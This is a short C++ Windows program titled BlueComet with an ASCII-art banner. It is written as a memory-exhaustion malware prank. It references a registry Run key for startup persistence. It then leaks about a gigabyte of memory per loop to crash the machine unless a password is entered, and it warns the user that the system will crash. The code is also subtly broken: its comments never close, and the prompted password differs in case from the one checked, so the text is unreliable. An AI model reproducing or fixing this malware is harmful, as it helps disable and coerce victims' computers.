/*@@@  @@@   @@@@@@   @@@@@@@    @@@@@@    @@@@@@   
/*@@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  
/*@@!  !@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  
/*!@!  @!!  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  
/*@!@@!@!   @!@!@!@!  @!@@!@!   @!@  !@!  @!@  !@!  
/*!!@!!!    !!!@!!!!  !!@!!!    !@!  !!!  !@!  !!!  
/*!!: :!!   !!:  !!!  !!:       !!:  !!!  !!:  !!!  
/*:!:  !:!  :!:  !:!  :!:       :!:  !:!  :!:  !:!  
/* ::  :::  ::   :::   ::       ::::: ::  ::::: ::  
/* :   :::   :   : :   :         : :  :    : :  :   


#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <Windows.h>
#pragma comment(lib, "Advapi32.lib")

using namespace std;

int main() {
      /* Create registry to include BlueComet in startup on all local machines 
    char re[MAX_PATH];
    string FP = string(re, GetModuleFileName(NULL, re, MAX_PATH));

    LONG ln = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "BlueComet", RRF_RT_REG_SZ, 0, 0, 0);
	/*Password to stop memory crash is P@thf1nder
    int i = 0;
    const char password[] = {'P', '@', 't', 'h', 'f', '1', 'n', 'd', 'e', 'r', '\0'};
    char input[11];
    bool stopProgram = false;

    while (!stopProgram) {
        for (int j = 0; j < 1024 * 1024; j++) { // add 1 MB of binary for each loop j
            char* buffer = new char[1024 * 1024]; // allocate 1 MB of memory
            memset(buffer, rand() % 256, 1024 * 1024); // fill with random binary
        }
        cout << "Loop " << i << " completed." << endl;
        i++;

        cout << "***FOR EDUCATIONAL PURPOSES ONLY*** Enter password 'P@thF1nder' or this system will crash.*** ";
        cin >> input;
        if (strcmp(input, password) == 0) {
            cout << "Password correct. BlueComet must be deleted from registry or this will happen again." << endl;
            stopProgram = true;
        }
    }
    return 0;
}
